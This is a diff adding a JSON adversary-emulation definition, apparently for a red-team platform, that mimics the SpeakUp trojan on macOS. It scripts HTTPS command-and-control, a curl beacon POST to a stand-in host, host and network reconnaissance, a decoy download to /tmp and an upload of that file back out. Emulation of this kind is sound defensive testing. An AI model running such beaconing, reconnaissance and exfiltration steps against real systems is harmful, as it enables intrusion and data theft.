@@ -1,0 +1,140 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "An example Threat replicating some of the behaviors of the SpeakUp trojan, as found by Check Point Research (https://research.checkpoint.com/speakup-a-new-undetected-backdoor-linux-trojan/). Note that this threat is not persistent.",
+        "display_name": "SpeakUp for OSX",
+        "name": "SpeakUp for OSX",
+        "operating_system_name": "macos",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "unicorn.scythedemo.com:443",
+                    "--headers": "User-Agent:Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405",
+                    "--multipart": 10240,
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "curl -d \"id=8675309&version=1.0.4\" -X POST http://1.1.1.1/misc/ui/images/Indxe.php",
+                "rtags": [
+                    "att&ck-technique:T1132"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "curl http://1.1.1.1/misc/ui/images/Indxe.php",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "uname -a",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ifconfig -a",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "arp -a",
+                "rtags": [
+                    "att&ck-technique:T1049"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cat /proc/cpuinfo | grep -c \"cpu family\" 2>&1",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "who -b",
+                "type": "message"
+            },
+            "10": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css\" --dest \"/tmp/not_really_a.sh\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cat /tmp/not_really_a.sh",
+                "rtags": [
+                    "att&ck-technique:T1204"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath /tmp/not_really_a.sh",
+                "rtags": [
+                    "att&ck-technique:T1020",
+                    "att&ck-technique:T1041"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "crontab -l",
+                "rtags": [
+                    "att&ck-technique:T1053"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
